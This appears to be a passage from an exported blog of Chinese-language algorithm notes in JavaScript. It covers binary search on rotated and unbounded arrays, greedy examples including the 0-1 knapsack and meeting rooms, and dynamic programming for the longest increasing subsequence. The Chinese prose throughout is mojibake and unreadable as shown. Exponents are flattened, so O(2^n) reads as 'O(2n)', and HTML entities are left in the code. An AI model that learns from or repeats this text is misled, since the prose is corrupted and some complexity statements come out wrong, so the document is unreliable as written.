&#125;&#125;const arr = [4, 5, 6, 7, 0, 1, 2]console.log(binarySearch(arr, 6))// 2 åœ¨å†³å®šåœ¨å“ªä¸€è¾¹è¿›è¡ŒäºŒåˆ†æœç´¢çš„æ—¶å€™ï¼Œåˆ©ç”¨äº†æ—‹è½¬æ•°ç»„çš„æ€§è´¨ï¼Œè¿™å°±æ˜¯è¿™é“é¢˜çš„å·§å¦™ä¹‹å¤„ã€‚ äºŒåˆ†æœç´¢ï¼šä¸å®šé•¿çš„è¾¹ç•Œå‰é¢ä»‹ç»çš„äºŒåˆ†æœç´¢çš„ä¾‹é¢˜éƒ½ç»™å®šäº†ä¸€ä¸ªå…·ä½“èŒƒå›´æˆ–è€…åŒºé—´ï¼Œé‚£ä¹ˆå¯¹äºŽæ²¡æœ‰ç»™å®šæ˜Žç¡®åŒºé—´çš„é—®é¢˜èƒ½ä¸èƒ½è¿ç”¨äºŒåˆ†æœç´¢å‘¢ï¼Ÿ ä¾‹é¢˜ï¼šæœ‰ä¸€æ®µä¸çŸ¥é“å…·ä½“é•¿åº¦çš„æ—¥å¿—æ–‡ä»¶ï¼Œé‡Œé¢è®°å½•äº†æ¯æ¬¡ç™»å½•çš„æ—¶é—´æˆ³ï¼Œå·²çŸ¥æ—¥å¿—æ˜¯æŒ‰é¡ºåºä»Žå¤´åˆ°å°¾è®°å½•çš„ï¼Œæ²¡æœ‰è®°å½•æ—¥å¿—çš„åœ°æ–¹ä¸ºç©ºï¼Œè¦æ±‚å½“å‰æ—¥å¿—çš„é•¿åº¦ã€‚ äºŒåˆ†æœç´¢ä¸å®šé•¿çš„è¾¹ç•Œé—®é¢˜è§£é¢˜æ€è·¯å¯ä»¥æŠŠè¿™ä¸ªé—®é¢˜çœ‹æˆæ˜¯ä¸çŸ¥é“é•¿åº¦çš„æ•°ç»„ï¼Œæ•°ç»„ä»Žå¤´å¼€å§‹è®°å½•éƒ½æ˜¯æ—¶é—´æˆ³ï¼Œåˆ°äº†æŸä¸ªä½ç½®å°±æˆä¸ºäº†ç©ºï¼š[2019-01-14, 2019-01-17, â€¦ , 2019-08-04, â€¦. , null, null, null ...]ã€‚ æ€è·¯ 1ï¼šé¡ºåºéåŽ†è¯¥æ•°ç»„ï¼Œä¸€ç›´éåŽ†ä¸‹åŽ»ï¼Œå½“å‘çŽ°ç¬¬ä¸€ä¸ª null çš„æ—¶å€™ï¼Œå°±çŸ¥é“äº†æ—¥å¿—çš„æ€»æ•°é‡ã€‚å¾ˆæ˜¾ç„¶ï¼Œè¿™æ˜¯å¾ˆä½Žæ•ˆçš„åŠžæ³•ã€‚ æ€è·¯ 2ï¼šå€Ÿç”¨äºŒåˆ†æœç´¢çš„æ€æƒ³ï¼Œåç€è¿›è¡Œæœç´¢ã€‚ ä¸€å¼€å§‹è®¾ç½® low = 0ï¼Œhigh = 1 åªè¦ logs[high] ä¸ä¸º nullï¼Œhigh *= 2 å½“ logs[high] ä¸º null çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨åŒºé—´ [0, high] è¿›è¡Œæ™®é€šçš„äºŒåˆ†æœç´¢ äºŒåˆ†æœç´¢ä¸å®šé•¿çš„è¾¹ç•Œé—®é¢˜ä»£ç å®žçŽ°123456789101112131415161718192021222324252627282930313233343536373839// å¯¹äºŽä¸å®šé•¿è¾¹ç•Œé—®é¢˜ï¼Œè¿›è¡ŒäºŒåˆ†æœç´¢// ä¸æ–­è¯•æŽ¢åœ¨ä»€ä¹ˆä½ç½®å‡ºçŽ°ç©ºçš„æ—¥å¿—const getUpperBound = function (logs, high) &#123; high = high === undefined ? 1 : high if (logs[high] === null) &#123; return high &#125; if (logs[high] === undefined) &#123; return logs.length &#125; return getUpperBound(logs, high * 2)&#125;// è¿ç”¨äºŒåˆ†æœç´¢å¯»æ‰¾æ—¥å¿—é•¿åº¦const binarySearch = function (logs, low, high) &#123; low = low === undefined ? 0 : low high = high === undefined ? logs.length : high if (low &gt; high) &#123; return -1 &#125; let middle = low + Math.floor((high - low) / 2) if (logs[middle] === null &amp;&amp; logs[middle - 1] !== null) &#123; return middle &#125; if (logs[middle] === null) &#123; return binarySearch(logs, low, middle - 1) &#125; else &#123; return binarySearch(logs, middle + 1, high) &#125;&#125;const arr = [1, 2, 3, 4, 5, null, null, null]console.log(binarySearch(arr, 0, getUpperBound(arr)))// 5 è´ªå©ªï¼ˆGreedyï¼‰è´ªå©ªç®—æ³•çš„ Wikipedia å®šä¹‰ï¼šæ˜¯ä¸€ç§åœ¨æ¯ä¸€æ­¥é€‰ä¸­éƒ½é‡‡å–åœ¨å½“å‰çŠ¶æ€ä¸‹æœ€å¥½æˆ–æœ€ä¼˜çš„é€‰æ‹©ï¼Œä»Žè€Œå¸Œæœ›å¯¼è‡´ç»“æžœæ˜¯æœ€å¥½æˆ–æœ€ä¼˜çš„ç®—æ³•ã€‚ ä¼˜ç‚¹ï¼šå¯¹äºŽä¸€äº›é—®é¢˜ï¼Œéžå¸¸ç›´è§‚æœ‰æ•ˆã€‚ ç¼ºç‚¹ï¼š å¹¶ä¸æ˜¯æ‰€æœ‰é—®é¢˜éƒ½èƒ½ç”¨å®ƒåŽ»è§£å†³ï¼› å¾—åˆ°çš„ç»“æžœå¹¶ä¸€å®šä¸æ˜¯æ­£ç¡®çš„ï¼Œå› ä¸ºè¿™ç§ç®—æ³•å®¹æ˜“è¿‡æ—©åœ°åšå‡ºå†³å®šï¼Œä»Žè€Œæ²¡æœ‰åŠžæ³•è¾¾åˆ°æœ€ä¼˜è§£ã€‚ ä¸‹é¢é€šè¿‡ä¾‹é¢˜æ¥åŠ æ·±å¯¹è´ªå©ªç®—æ³•çš„è®¤è¯†ã€‚ä¾‹é¢˜ï¼š0-1 èƒŒåŒ…é—®é¢˜ï¼Œèƒ½ä¸èƒ½è¿ç”¨è´ªå©ªç®—æ³•åŽ»è§£å†³ã€‚ æœ‰ä¸‰ç§ç­–ç•¥ï¼š é€‰å–ä»·å€¼æœ€å¤§çš„ç‰©å“ é€‰æ‹©é‡é‡æœ€è½»çš„ç‰©å“ é€‰å–ä»·å€¼/é‡é‡æ¯”æœ€å¤§çš„ç‰©å“ ç­–ç•¥ 1ï¼šæ¯æ¬¡å°½å¯èƒ½é€‰æ‹©ä»·å€¼æœ€å¤§çš„ï¼Œè¡Œä¸é€šã€‚ä¸¾ä¾‹è¯´æ˜Žå¦‚ä¸‹ã€‚ ç‰©å“æœ‰ï¼šA B Cé‡é‡åˆ†åˆ«æ˜¯ï¼š25, 10, 10ä»·å€¼åˆ†åˆ«æ˜¯ï¼š100ï¼Œ80ï¼Œ80 æ ¹æ®ç­–ç•¥ï¼Œé¦–å…ˆé€‰å–ç‰©å“ Aï¼ŒæŽ¥ä¸‹æ¥å°±ä¸èƒ½å†åŽ»é€‰å…¶ä»–ç‰©å“ï¼Œä½†æ˜¯ï¼Œå¦‚æžœé€‰å– B å’Œ Cï¼Œç»“æžœä¼šæ›´å¥½ã€‚ ç­–ç•¥ 2ï¼šæ¯æ¬¡å°½å¯èƒ½é€‰æ‹©è½»çš„ç‰©å“ï¼Œè¡Œä¸é€šã€‚ä¸¾ä¾‹è¯´æ˜Žå¦‚ä¸‹ã€‚ ç‰©å“æœ‰ï¼šA B Cé‡é‡åˆ†åˆ«ä¸ºï¼š25, 10, 10ä»·å€¼åˆ†åˆ«ä¸ºï¼š100, 5, 5 æ ¹æ®ç­–ç•¥ï¼Œé¦–å…ˆé€‰å–ç‰©å“ B å’Œ Cï¼ŒæŽ¥ä¸‹æ¥å°±ä¸èƒ½é€‰ Aï¼Œä½†æ˜¯ï¼Œå¦‚æžœé€‰ Aï¼Œä»·å€¼æ›´å¤§ã€‚ ç­–ç•¥ 3ï¼šæ¯æ¬¡å°½å¯èƒ½é€‰ä»·å€¼/é‡é‡æ¯”æœ€å¤§çš„ï¼Œè¡Œä¸é€šã€‚ä¸¾ä¾‹è¯´æ˜Žå¦‚ä¸‹ã€‚ ç‰©å“æœ‰ï¼šA B Cé‡é‡æ˜¯ï¼š25, 10, 10ä»·å€¼æ˜¯ï¼š25, 10, 10 æ ¹æ®ç­–ç•¥ï¼Œä¸‰ç§ç‰©å“çš„ä»·å€¼/é‡é‡æ¯”éƒ½æ˜¯ä¸€æ ·ï¼Œå¦‚æžœé€‰ Aï¼Œç­”æ¡ˆä¸å¯¹ï¼Œåº”è¯¥é€‰ B å’Œ Cã€‚ ç”±ä¸Šï¼Œè´ªå©ªç®—æ³•æ€»æ˜¯åšå‡ºåœ¨å½“å‰çœ‹æ¥æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚å³ï¼Œå®ƒä¸ä»Žæ•´ä½“çš„è§’åº¦åŽ»è€ƒè™‘ï¼Œä»…ä»…å¯¹å±€éƒ¨çš„æœ€ä¼˜è§£æ„Ÿå…´è¶£ã€‚å› æ­¤ï¼Œåªæœ‰å½“é‚£äº›å±€éƒ¨æœ€ä¼˜ç­–ç•¥èƒ½äº§ç”Ÿå…¨å±€æœ€ä¼˜ç­–ç•¥çš„æ—¶å€™ï¼Œæ‰èƒ½ç”¨è´ªå©ªç®—æ³•ã€‚ å®šä¼šè®®å®¤é—®é¢˜LeetCode ç¬¬ 253 é¢˜ï¼Œä¼šè®®å®¤ IIï¼Œç»™å®šä¸€ç³»åˆ—ä¼šè®®çš„èµ·å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ï¼Œæ±‚æœ€å°‘éœ€è¦å¤šå°‘ä¸ªä¼šè®®å®¤å°±å¯ä»¥è®©è¿™äº›ä¼šè®®é¡ºåˆ©å¬å¼€ã€‚ å®šä¼šè®®å®¤é—®é¢˜è§£é¢˜æ€è·¯æ€è·¯ 1ï¼šæš´åŠ›æ³•ã€‚ æŠŠæ‰€æœ‰çš„ä¼šè®®ç»„åˆæ‰¾å‡ºæ¥ï¼› ä»Žæœ€é•¿çš„ç»„åˆå¼€å§‹æ£€æŸ¥ï¼Œçœ‹çœ‹å„ä¸ªä¼šè®®ä¹‹é—´æœ‰æ²¡æœ‰å†²çªï¼› ç›´åˆ°å‘çŽ°ä¸€ç»„ä¼šè®®æ²¡æœ‰å†²çªï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ç­”æ¡ˆã€‚ å¾ˆæ˜Žæ˜¾ï¼Œè¿™æ ·çš„è§£æ³•æ˜¯éžå¸¸æ²¡æœ‰æ•ˆçŽ‡çš„ã€‚ æ€è·¯ 2ï¼šè´ªå©ªç®—æ³• ä¼šè®®æŒ‰ç…§èµ·å§‹æ—¶é—´é¡ºåºè¿›è¡Œï¼› è¦ç»™æ–°çš„å³å°†å¼€å§‹çš„ä¼šè®®æ‰¾ä¼šè®®å®¤æ—¶ï¼Œå…ˆçœ‹å½“å‰æœ‰æ— ç©ºä¼šè®®å®¤ï¼› æœ‰åˆ™åœ¨ç©ºä¼šè®®å®¤å¼€ä¼šï¼Œæ— åˆ™å¼€è®¾ä¸€é—´æ–°ä¼šè®®å®¤ã€‚ å®šä¼šè®®å®¤é—®é¢˜ä»£ç å®žçŽ°123456789101112131415161718192021222324252627282930313233343536373839404142434445// èŽ·å–å·²å®‰æŽ’ä¼šè®®å®¤ä¸­æœ€æ—©ç»“æŸçš„ä¼šè®®const getEarlyEndMetting = function (meetingRooms) &#123; meetingRooms.sort((a, b) =&gt; a.end - b.end) return meetingRooms.shift()&#125;const minMeetingRooms = function (intervals) &#123; // å°†ä¼šè®®æŒ‰å¼€å§‹æ—¶é—´æŽ’åº intervals.sort((a, b) =&gt; a.start - b.start) const meetingRooms = [] // è®©ç¬¬ä¸€ä¸ªä¼šè®®åœ¨ç¬¬ä¸€ä¸ªä¼šè®®å®¤ä¸¾è¡Œ meetingRooms.push(intervals[0]) for (let i = 1; i &lt; intervals.length; i++) &#123; const meeting = getEarlyEndMetting(meetingRooms) // ä»Žç¬¬äºŒä¸ªä¼šè®®å¼€å§‹ï¼Œå¯¹äºŽæ¯ä¸ªä¼šè®®ï¼Œéƒ½ä»Žå®‰æŽ’ä¼šè®®å®¤çš„ä¼šè®®ä¸­å–å‡ºä¸€ä¸ªæœ€æ—©ç»“æŸçš„ // è‹¥å½“å‰ä¼šè®®å¯ä»¥ç­‰ä¼šè®®å®¤è¢«è…¾å‡ºæ‰å¼€å§‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥é‡å¤åˆ©ç”¨è¿™ä¸ªä¼šè®®å®¤ if (intervals[i].start &gt;= meeting.end) &#123; meeting.end = intervals[i].end &#125; else &#123; meetingRooms.push(intervals[i]) &#125; // å°†å–å‡ºçš„ä¼šè®®é‡æ–°æ”¾å›žå·²åˆ†é…çš„ä¼šè®®å®¤é‡Œ meetingRooms.push(meeting) &#125; console.log('meetingRooms: ', meetingRooms) // meetingRooms: [ &#123; start: 1, end: 7 &#125;, &#123; start: 2, end: 8 &#125; ] return meetingRooms.length&#125;const arr = [ &#123; start: 1, end: 3 &#125;, &#123; start: 4, end: 5 &#125;, &#123; start: 5, end: 6 &#125;, &#123; start: 2, end: 4 &#125;, &#123; start: 4, end: 7 &#125;, &#123; start: 6, end: 7 &#125;, &#123; start: 7, end: 8 &#125;]console.log(minMeetingRooms(arr))// 2 ä¸ºä»€ä¹ˆè´ªå©ªç®—æ³•èƒ½åœ¨è¿™é‡Œæˆç«‹ï¼Ÿæ¯å½“é‡åˆ°ä¸€ä¸ªæ–°çš„ä¼šè®®æ—¶ï¼Œæ€»æ˜¯è´ªå©ªåœ°ä»Žæ‰€æœ‰ä¼šè®®å®¤é‡Œæ‰¾å‡ºæœ€å…ˆç»“æŸä¼šè®®çš„é‚£ä¸ªã€‚ ä¸ºä»€ä¹ˆè¿™æ ·å¯ä»¥äº§ç”Ÿæœ€ä¼˜çš„ç»“æžœï¼Ÿè‹¥é€‰æ‹©çš„ä¼šè®®å®¤ä¸­ä¼šè®®æœªç»“æŸï¼Œåˆ™æ„å‘³ç€éœ€è¦å¼€è¾Ÿä¸€ä¸ªæ–°ä¼šè®®å®¤ï¼Œè¿™å·²ç»ä¸æ˜¯å½“å‰çš„æœ€ä¼˜è§£äº†ã€‚]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€Œè¶…è¯¦ç¬”è®°ã€ç®—æ³•â€”â€”åŠ¨æ€è§„åˆ’ï¼ˆJSç‰ˆï¼‰]]></title>
    <url>%2F2020%2F11%2F23%2Falgorithm-dp%2F</url>
    <content type="text"><![CDATA[åˆ¤æ–­åŠ¨æ€è§„åˆ’åˆ¤æ–­ä¸€ä¸ªç®—æ³•é—®é¢˜æ˜¯å¦å±žäºŽåŠ¨æ€è§„åˆ’é—®é¢˜ï¼Œä¸»è¦ä¾æ®æœ‰ä¸¤ç‚¹ï¼š æœ€ä¼˜å­ç»“æž„ï¼šä¸€ä¸ªé—®é¢˜çš„æœ€ä¼˜è§£æ˜¯ç”±å®ƒçš„å„ä¸ªå­é—®é¢˜çš„æœ€ä¼˜è§£å†³å®šçš„ã€‚ é‡å å­é—®é¢˜ï¼šè§£å†³ä¸€ä¸ªé—®é¢˜éœ€è¦æ‹†è§£è®¸å¤šå­é—®é¢˜ï¼Œè€Œè¿™ä¸ªå­é—®é¢˜æœ‰é‡å¤ã€‚ æœ€é•¿å­åºåˆ—é—®é¢˜LeetCode ç¬¬ 300 é¢˜ï¼šç»™å®šä¸€ä¸ªæ— åºçš„æ•´æ•°æ•°ç»„ï¼Œæ‰¾åˆ°å…¶ä¸­æœ€é•¿å­åºåˆ—é•¿åº¦ã€‚ è¯´æ˜Žï¼šå¯èƒ½ä¼šæœ‰å¤šç§æœ€é•¿ä¸Šå‡å­åºåˆ—çš„ç»„åˆï¼Œä½ åªéœ€è¦è¾“å‡ºå¯¹åº”çš„é•¿åº¦å³å¯ã€‚ä½ ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åº”è¯¥ä¸º O(n2)ã€‚æ³¨æ„ï¼šå­åºåˆ—å’Œå­æ•°ç»„ä¸åŒï¼Œå®ƒå¹¶ä¸è¦æ±‚å…ƒç´ æ˜¯è¿žç»­çš„ã€‚ ç¤ºä¾‹ è¾“å…¥ï¼š[ 10, 9, 2, 5, 3, 7, 101, 18 ]è¾“å‡ºï¼š4å³ï¼Œæœ€é•¿çš„ä¸Šå‡å­åºåˆ—æ˜¯ [2, 3, 7, 101]ï¼Œå®ƒçš„é•¿åº¦æ˜¯ 4ã€‚ æœ€é•¿å­åºåˆ—é—®é¢˜è§£é¢˜æ€è·¯åœ¨ç»™å®šçš„æ•°ç»„é‡Œï¼Œæœ‰å¾ˆå¤šçš„ä¸Šå‡å­åºåˆ—ï¼Œä¾‹å¦‚ï¼š[10, 101]ï¼Œ[9, 101]ï¼Œ[2, 5, 7, 101]ï¼Œä»¥åŠ [2, 3, 7, 101]ï¼Œåªéœ€è¦æ‰¾å‡ºå…¶ä¸­ä¸€ä¸ªæœ€é•¿çš„ã€‚ æ€è·¯ 1ï¼šæš´åŠ›æ³• æ‰¾å‡ºæ‰€æœ‰çš„å­åºåˆ—ï¼Œç„¶åŽä»Žä¸­è¿”å›žä¸€ä¸ªæœ€é•¿çš„ã€‚ ä»Žä¸€ä¸ªæ•°ç»„ä¸­ç½—åˆ—å‡ºæ‰€æœ‰çš„éžç©ºå­æ•°ç»„æœ‰ï¼š nÃ—(n + 1)/2 ç§ï¼Œå³ O(n2)ï¼Œé‚£ä¹ˆç½—åˆ—å‡ºæ‰€æœ‰çš„éžç©ºå­åºåˆ—æœ‰ 2nâˆ’1 ç§ã€‚å¤æ‚åº¦å°†æ˜¯ O(2n)ã€‚ æ€è·¯ 2ï¼šç¼©å°é—®é¢˜è§„æ¨¡ 1ã€æ‰¾æœ€ä¼˜å­ç»“æž„ï¼šè¾“å…¥è§„æ¨¡å¯¹åŠåˆ†ã€‚ [10, 9, 2, 5] æœ€é•¿çš„å­åºåˆ—åº”è¯¥æ˜¯ [2, 5]ï¼Œè€Œ [3, 7, 101, 4] æœ€é•¿çš„å­åºåˆ—æ˜¯ [3, 7, 101]ï¼Œç”±äºŽ 3 æ¯” 5 å°ï¼Œæ— æ³•ç®€å•åœ°ç»„åˆåœ¨ä¸€èµ·ã€‚å³è¯¥æ–¹æ³•ä¸‹ï¼Œæ€»é—®é¢˜çš„è§£æ— æ³•ç›´è§‚åœ°é€šè¿‡å­é—®é¢˜çš„æœ€ä¼˜è§£æ±‚å¾—ã€‚ 2ã€æ‰¾æœ€ä¼˜å­ç»“æž„ï¼šæ¯æ¬¡å‡ä¸€ä¸ªã€‚ å‡è®¾ f(n) è¡¨ç¤ºçš„æ˜¯æ•°ç»„ nums[0ï¼Œâ€¦ï¼Œnâˆ’1] ä¸­æœ€é•¿çš„å­åºåˆ—ï¼Œé‚£ä¹ˆ f(nâˆ’1) å°±æ˜¯æ•°ç»„ nums[0ï¼Œâ€¦ï¼Œnâˆ’2] ä¸­æœ€é•¿çš„å­åºåˆ—ï¼Œä¾æ­¤ç±»æŽ¨ï¼Œf(1) å°±æ˜¯ nums[0] çš„æœ€é•¿å­åºåˆ—ã€‚ å‡è®¾å·²ç»è§£å†³äº† f(1)ï¼Œf(2)ï¼Œâ€¦ f(nâˆ’1) çš„é—®é¢˜ï¼Œè€ƒè™‘æœ€åŽä¸€ä¸ªæ•° nums[nâˆ’1]ï¼Œä¹Ÿå¿…ç„¶è€ƒè™‘åˆ°å€’æ•°ç¬¬äºŒä¸ªæ•° nums[nâˆ’2]ï¼Œæ‰€ä»¥ f(n) æŒ‡ï¼šå¦‚æžœåŒ…å«äº†æœ€åŽçš„æ•°ï¼Œé‚£ä¹ˆæœ€é•¿çš„å­åºåˆ—åº”è¯¥æ˜¯ä»€ä¹ˆã€‚æ³¨æ„ï¼šæœ€åŽè¿™ä¸ªæ•°å¿…é¡»åŒ…å«åœ¨å­åºåˆ—å½“ä¸­çš„ã€‚ å¦‚ä½•é€šè¿‡ f(1)ï¼Œf(2)ï¼Œâ€¦f(nâˆ’1) æŽ¨å¯¼å‡º f(n) å‘¢ï¼Ÿç”±äºŽæœ€åŽä¸€ä¸ªæ•°æ˜¯ 4ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å‰é¢çš„ f(1)ï¼Œf(2)ï¼Œâ€¦f(nâˆ’1) å½“ä¸­ï¼Œæ‰¾å‡ºä¸€ä¸ªä»¥å°äºŽ 4 çš„æ•°ä½œä¸ºç»“å°¾çš„æœ€é•¿çš„å­åºåˆ—ï¼Œç„¶åŽæŠŠ 4 æ·»åŠ åˆ°æœ€åŽï¼Œé‚£ä¹ˆ f(n) å°±ä¸€å®šæ˜¯ä»¥ 4 ä½œä¸ºç»“å°¾çš„æœ€é•¿çš„å­åºåˆ—äº†ã€‚ æœ€é•¿çš„å­åºåˆ—å¹¶ä¸ä¸€å®šä¼šåŒ…å« 4ï¼ŒéåŽ† f(1)ï¼Œf(2)ï¼Œâ€¦f(nâˆ’1) ï¼Œæ‰¾å‡ºæœ€é•¿çš„ã€‚ä¾‹å¦‚ï¼Œä»¥ 101 ç»“å°¾çš„æœ€é•¿çš„ä¸Šå‡å­åºåˆ—æ˜¯ä»€ä¹ˆã€‚ æ€»ç»“è§£å†³åŠ¨æ€è§„åˆ’é—®é¢˜çš„ä¸¤ä¸ªéš¾ç‚¹ã€‚ ï¼ˆ1ï¼‰å¦‚ä½•å®šä¹‰ f(n)ã€‚å¯¹äºŽè¿™é“é¢˜è€Œè¨€ï¼Œf(n) æ˜¯ä»¥ nums[nâˆ’1] ç»“å°¾çš„æœ€é•¿çš„ä¸Šå‡å­åºåˆ—çš„é•¿åº¦ã€‚ï¼ˆ2ï¼‰å¦‚ä½•é€šè¿‡ f(1)ï¼Œf(2)ï¼Œâ€¦f(nâˆ’1) æŽ¨å¯¼å‡º f(n)ï¼Œå³çŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€‚æœ¬é¢˜ä¸­ï¼Œnums[nâˆ’1] å’Œæ¯”å®ƒå°çš„æ¯ä¸€ä¸ªå€¼ nums[i] è¿›è¡Œæ¯”è¾ƒï¼Œå…¶ä¸­ 1&lt;=i&lt;nï¼ŒåŠ  1 å³å¯ã€‚å› æ­¤çŠ¶æ€è½¬ç§»æ–¹ç¨‹å°±æ˜¯ï¼šf(n)=max (1 &lt;= i &lt; nâˆ’1, nums[iâˆ’1] &lt; nums[nâˆ’1]) { f(i) } + 1ã€‚ ä»¥ä¸Šè¯æ˜Žäº†è¿™ä¸ªé—®é¢˜æœ‰ä¸€ä¸ªæœ€ä¼˜çš„å­ç»“æž„ã€‚ 3ã€æ‰¾é‡å å­é—®é¢˜ åœ¨åˆ†æžæœ€åŽä¸€ä¸ªæ•° 4 çš„æ—¶å€™ï¼Œä»¥ 3 ç»“å°¾çš„æœ€é•¿çš„ä¸Šå‡å­åºåˆ—é•¿åº¦å°±æ˜¯ f(5)ï¼Œå› ä¸º 3 æ˜¯ç¬¬ 5 ä¸ªæ•°ã€‚æŠŠé—®é¢˜è§„æ¨¡ç¼©å° 2 ä¸ªï¼Œå½“å‰çš„æ•°å˜æˆ 101 çš„æ—¶å€™ï¼Œæ‰¾æ¯”å®ƒå°çš„æ•°ï¼Œåˆå‘çŽ°äº† 3ï¼Œè¿™ä¸ªæ—¶å€™åˆä¼šåŽ»é‡å¤è®¡ç®—ä¸€é f(5)ï¼Œè¯´æ˜Žè¯¥é¢˜æœ‰é‡å çš„å­é—®é¢˜ã€‚ å› æ­¤ï¼Œå¯ä»¥è¿ç”¨åŠ¨æ€è§„åˆ’çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æœ€é•¿å­åºåˆ—é—®é¢˜é€’å½’+è‡ªé¡¶è€Œä¸‹çš„å®žçŽ°æ–¹å¼ç”¨é€’å½’çš„æ–¹æ³•æ±‚è§£çŠ¶æ€è½¬ç§»æ–¹ç¨‹å¼ f(n)=max (1 &lt;= i &lt; nâˆ’1, nums[iâˆ’1] &lt; nums[nâˆ’1]) { f(i) } + 1ã€‚ å¯¹äºŽæ¯ä¸ª nï¼Œè¦ä»Ž 0 å¼€å§‹éåŽ† åœ¨ n ä¹‹å‰ï¼Œæ‰¾å‡ºæ¯” nums[nâˆ’1] å°çš„æ•° é€’å½’åœ°è°ƒç”¨ f å‡½æ•°ï¼Œæ‰¾å‡ºæœ€å¤§çš„ï¼Œæœ€åŽåŠ ä¸Š 1 å½“ i ç­‰äºŽ 0 çš„æ—¶å€™ï¼Œåº”è¯¥è¿”å›ž 0ï¼›å½“ i ç­‰äºŽ 1 çš„æ—¶å€™åº”è¯¥è¿”å›ž 1ã€‚ ç”±äºŽé€’å½’çš„è§£æ³•éœ€è¦è€—è´¹éžå¸¸å¤šçš„é‡å¤è®¡ç®—ï¼Œè€Œä¸”å¾ˆå¤šè®¡ç®—éƒ½æ˜¯é‡å çš„ï¼Œé¿å…é‡å è®¡ç®—çš„ä¸€ç§åŠžæ³•å°±æ˜¯è®°å¿†åŒ–ã€‚è®°å¿†åŒ–ï¼Œå°±æ˜¯å°†å·²ç»è®¡ç®—å‡ºæ¥çš„ç»“æžœä¿å­˜èµ·æ¥ï¼Œé‚£ä¹ˆä¸‹æ¬¡é‡åˆ°ç›¸åŒçš„è¾“å…¥æ—¶ï¼Œç›´æŽ¥è¿”å›žä¿å­˜å¥½çš„ç»“æžœï¼Œèƒ½å¤Ÿæœ‰æ•ˆèŠ‚çœäº†å¤§é‡çš„è®¡ç®—æ—¶é—´ã€‚ æœ€é•¿å­åºåˆ—é—®é¢˜ä»£ç å®žçŽ°åœ¨é€’å½’å®žçŽ°çš„åŸºç¡€ä¸Šå®žçŽ°è®°å¿†åŒ–ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142// å¯»æ‰¾æœ€é•¿å­åºåˆ—// é€’å½’ï¼Œè‡ªé¡¶è€Œä¸‹çš„æ–¹å¼class LongestSubsequence &#123; constructor(nums) &#123; this.max = 1 this.smap = new Map() this.recursion(nums, nums.length) &#125; recursion(nums, n) &#123; if (this.smap.has(n)) &#123; return this.smap.get(n) &#125; if (n &lt;= 1) &#123; return n &#125; let result = 0 let maxEndingHere = 1 // ä»Žå¤´éåŽ†æ•°ç»„ï¼Œé€’å½’æ±‚å‡ºä»¥æ¯ä¸ªç‚¹ä¸ºç»“å°¾çš„å­æ•°ç»„ä¸­æœ€é•¿ä¸Šå‡åºåˆ—çš„é•¿åº¦ for (let i = 1; i &lt; n; i++) &#123; result = this.recursion(nums, i) if (nums[i - 1] &lt; nums[n - 1] &amp;&amp; result + 1 &gt; maxEndingHere) &#123; maxEndingHere = result + 1 &#125; &#125; // åˆ¤æ–­ä¸€ä¸‹ï¼Œå¦‚æžœé‚£ä¸ªæ•°æ¯”ç›®å‰æœ€åŽä¸€ä¸ªæ•°å°ï¼Œé‚£ä¹ˆå°±èƒ½æž„æˆä¸€ä¸ªæ–°çš„ä¸Šå‡å­åºåˆ— if (this.max &lt; maxEndingHere) &#123; this.max = maxEndingHere &#125; this.smap.set(n, maxEndingHere) // è¿”å›žä»¥å½“å‰æ•°ç»“å°¾çš„ä¸Šå‡å­åºåˆ—çš„æœ€é•¿é•¿åº¦ return maxEndingHere &#125;&#125;const arr = [10, 9, 2, 5, 3, 7, 101, 18]const ls = new LongestSubsequence(arr)console.log('ls: ', ls.max) æœ€é•¿å­åºåˆ—é—®é¢˜é€’å½’+è‡ªé¡¶è€Œä¸‹çš„å®žçŽ°æ—¶é—´å¤æ‚åº¦åˆ†æžé€’å½’+è®°å¿†åŒ–çš„æ—¶é—´å¤æ‚åº¦ï¼Œå¦‚ä¸‹ã€‚ å‡½æ•° f æŒ‰åºä¼ é€’ nï¼Œnâˆ’1ï¼Œnâˆ’2 â€¦ æœ€åŽæ˜¯ 1ï¼ŒæŠŠç»“æžœç¼“å­˜å¹¶è¿”å›žï¼› é€’å½’è¿”å›žåˆ°è¾“å…¥ nï¼› ç¼“å­˜é‡Œå·²ç»ä¿å­˜äº† nâˆ’1 ä¸ªç»“æžœï¼› for å¾ªçŽ¯è°ƒç”¨é€’å½’å‡½æ•° nâˆ’1 æ¬¡ï¼Œä»Ž cache é‡Œç›´æŽ¥è¿”å›žç»“æžœã€‚ ä¸Šè¿°è¿‡ç¨‹çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(1)ã€‚å³å°†é—®é¢˜çš„è§„æ¨¡å¤§å°ä»Ž n é€æ¸å‡å°åˆ° 1 çš„æ—¶å€™ï¼Œé€šè¿‡å°†å„ä¸ªç»“æžœä¿å­˜èµ·æ¥ï¼Œå¯ä»¥å°† T(1)ï¼ŒT(2)ï¼Œâ€¦.T(nâˆ’1) çš„å¤æ‚åº¦é™ä½Žåˆ°çº¿æ€§çš„å¤æ‚åº¦ã€‚ çŽ°åœ¨ï¼Œå›žåˆ° T(n)ï¼Œåœ¨ for å¾ªçŽ¯é‡Œï¼Œå°è¯•ç€ä»Ž T(1)ï¼ŒT(2)â€¦.T(nâˆ’1) é‡Œå–å‡ºæœ€å¤§å€¼ï¼Œå› æ­¤ O(T(n))=O(T(1) + T(2) + â€¦ + T(nâˆ’1))=O(1 + 2 + â€¦. + nâˆ’1)=O(nÃ—(nâˆ’1)/2)=O(n2)ã€‚ æœ€åŽåŠ ä¸Šæž„å»ºç¼“å­˜ cache çš„æ—¶é—´ï¼Œæ•´ä½“çš„æ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(f(n))=O(n) + O(n^2)=O(n2)ã€‚é€šè¿‡è®°å¿†åŒ–çš„æ“ä½œï¼Œæˆ‘ä»¬æŠŠæ—¶é—´å¤æ‚åº¦ä»Ž O(2n) é™ä½Žåˆ°äº† 